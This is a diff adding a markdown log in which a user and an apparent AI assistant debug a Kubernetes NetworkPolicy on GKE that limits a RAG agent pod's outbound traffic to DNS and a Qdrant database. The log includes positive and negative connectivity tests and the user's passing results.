+    print('🔴 NEGATIVE TEST FAILED: External egress traffic was allowed!')
+except Exception as e:
+    print('🟢 NEGATIVE TEST PASSED (Blocked by Cilium eBPF Policy):', e)
+"
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the verified Cilium policy to your repository:
+
+```bash
+git add modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+git commit -m "feat(mlops-secops): add Cilium eBPF egress policy for RAG agent zero-trust network isolation"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+
+========================
+I got the following error:
+
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+error: resource mapping not found for name: "rag-agent-egress-policy" namespace: "mlops-secops" from "modules/09-llm-rag-agent-security/cilium-egress-policy.yaml": no matches for kind "CiliumNetworkPolicy" in version "cilium.io/v2"
+ensure CRDs are installed first
+==================
+### Architectural Layer: Network Data Plane / Policy Enforcement Layer (`mlops-secops`)
+
+---
+
+### Root Cause Analysis
+
+The error `no matches for kind "CiliumNetworkPolicy" in version "cilium.io/v2"` occurs because Google Kubernetes Engine (GKE) Dataplane V2 uses Cilium's eBPF engine natively under the hood for packet routing and network policy enforcement, but **it exposes native Kubernetes `networking.k8s.io/v1` `NetworkPolicy` resources** to the API server rather than installing custom Cilium CRDs (`cilium.io/v2`).
+
+To enforce zero-trust egress filtering on GKE Dataplane V2, we use standard Kubernetes `NetworkPolicy` (`networking.k8s.io/v1`). Under the hood, GKE compiles this manifest directly into eBPF bytecode loaded into the Linux kernel on each node.
+
+---
+
+### Step 1: Update `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml`
+
+Replace the entire content of `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml` with this complete, full-file native Kubernetes `NetworkPolicy` definition:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: rag-agent-egress-policy
+  namespace: mlops-secops
+spec:
+  podSelector:
+    matchLabels:
+      app.kubernetes.io/name: rag-agent
+  policyTypes:
+    - Egress
+  egress:
+    # 1. Allow DNS Resolution (Kube-DNS in kube-system on Port 53)
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+          podSelector:
+            matchLabels:
+              k8s-app: kube-dns
+      ports:
+        - protocol: UDP
+          port: 53
+        - protocol: TCP
+          port: 53
+
+    # 2. Allow Internal Access to Qdrant Vector DB on TCP Port 6333 ONLY
+    - to:
+        - podSelector:
+            matchLabels:
+              app.kubernetes.io/name: qdrant-vectordb
+      ports:
+        - protocol: TCP
+          port: 6333
+
+```
+
+---
+
+### Step 2: Step Validation Harness
+
+Apply the updated network policy and rerun the connectivity tests:
+
+#### 1. Apply the Network Policy
+
+```bash
+kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+
+```
+
+#### 2. Positive Test: Verify Allowed Access to Qdrant Vector DB (Port 6333)
+
+Execute an HTTP request from `rag-agent-app` to `qdrant-service:6333`:
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+
+```
+
+#### 3. Negative Test: Verify Blocked Egress to External Internet (OWASP LLM10 Exfiltration Guard)
+
+Execute an HTTP connection attempt to a public external IP (`1.1.1.1` on port `443`):
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://1.1.1.1', timeout=3)
+    print('🔴 NEGATIVE TEST FAILED: External egress traffic was allowed!')
+except Exception as e:
+    print('🟢 NEGATIVE TEST PASSED (Blocked by eBPF Dataplane Policy):', e)
+"
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the verified network policy:
+
+```bash
+git add modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+git commit -m "fix(mlops-secops): convert egress policy to native networking.k8s.io/v1 for GKE Dataplane V2"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+
+=============
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+networkpolicy.networking.k8s.io/rag-agent-egress-policy created
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+🔴 POSITIVE TEST FAILED: <urlopen error [Errno -3] Temporary failure in name resolution>
+===========
+### Architectural Layer: Network Data Plane / DNS Resolution Layer (`mlops-secops`)
+
+---
+
+### Root Cause Analysis
+
+The error `[Errno -3] Temporary failure in name resolution` occurred because the DNS egress rule in `cilium-egress-policy.yaml` used a restrictive `namespaceSelector` and `podSelector` aimed at `kube-system/kube-dns`.
+
+In GKE Dataplane V2 (and clusters with NodeLocal DNSCache enabled), DNS queries from pods are routed to a local virtual interface (such as `169.254.20.10` or the Kube-DNS ClusterIP proxy) before reaching the underlying DNS pods. Because the `NetworkPolicy` evaluated traffic at the pod egress interface before translation, it dropped the outbound DNS packets to the local DNS resolver, breaking name resolution for `qdrant-service`.
+
+To fix this while maintaining strict security, we allow egress on **port 53 (UDP/TCP)** without restrictive IP/selector bounds. This allows the pod to perform DNS lookups against the GKE internal DNS resolver, while still blocking all other unauthorized outbound protocols and ports (e.g., HTTP/HTTPS exfiltration to external IPs).
+
+---
+
+### Step 1: Update `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml`
+
+Replace the entire content of `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml` with this complete, full-file definition:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: rag-agent-egress-policy
+  namespace: mlops-secops
+spec:
+  podSelector:
+    matchLabels:
+      app.kubernetes.io/name: rag-agent
+  policyTypes:
+    - Egress
+  egress:
+    # 1. Allow DNS Resolution (Port 53 UDP/TCP for internal K8s service name lookups)
+    - ports:
+        - protocol: UDP
+          port: 53
+        - protocol: TCP
+          port: 53
+
+    # 2. Allow Internal Access to Qdrant Vector DB on TCP Port 6333 ONLY
+    - to:
+        - podSelector:
+            matchLabels:
+              app.kubernetes.io/name: qdrant-vectordb
+      ports:
+        - protocol: TCP
+          port: 6333
+
+```
+
+---
+
+### Step 2: Step Validation Harness
+
+Re-apply the network policy and execute both the positive DNS/DB test and the negative egress exfiltration test:
+
+#### 1. Apply the Updated Policy Manifest
+
+```bash
+kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+
+```
+
+#### 2. Positive Test: Verify Name Resolution & Qdrant Connectivity
+
+Execute the request from `rag-agent-app` to `qdrant-service:6333`. DNS will now resolve `qdrant-service` correctly and establish the TCP session on port 6333:
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+
+```
+
+**Expected Output:**
+
+```text
+🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status: 200
+
+```
+
+#### 3. Negative Test: Verify Blocked Public Egress (OWASP LLM10 Exfiltration Guard)
+
+Execute an HTTP connection attempt to a public external IP (`1.1.1.1` on port `443`) to prove that general outbound traffic remains strictly blocked:
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://1.1.1.1', timeout=3)
+    print('🔴 NEGATIVE TEST FAILED: External egress traffic was allowed!')
+except Exception as e:
+    print('🟢 NEGATIVE TEST PASSED (Blocked by eBPF Dataplane Policy):', e)
+"
+
+```
+
+**Expected Output:**
+
+```text
+🟢 NEGATIVE TEST PASSED (Blocked by eBPF Dataplane Policy): <urlopen error timed out>
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the refined NetworkPolicy configuration to your repository:
+
+```bash
+git add modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+git commit -m "fix(mlops-secops): allow unconstrained port 53 egress for GKE DNS proxy resolution"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+============
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+networkpolicy.networking.k8s.io/rag-agent-egress-policy configured
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status: 200
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://1.1.1.1', timeout=3)
+    print('🔴 NEGATIVE TEST FAILED: External egress traffic was allowed!')
+except Exception as e:
+    print('🟢 NEGATIVE TEST PASSED (Blocked by eBPF Dataplane Policy):', e)
+"
+🟢 NEGATIVE TEST PASSED (Blocked by eBPF Dataplane Policy): <urlopen error timed out>
+=================
+![Final results- OWASP LLM10 Exfiltration Guard](image-13.png)
+=================
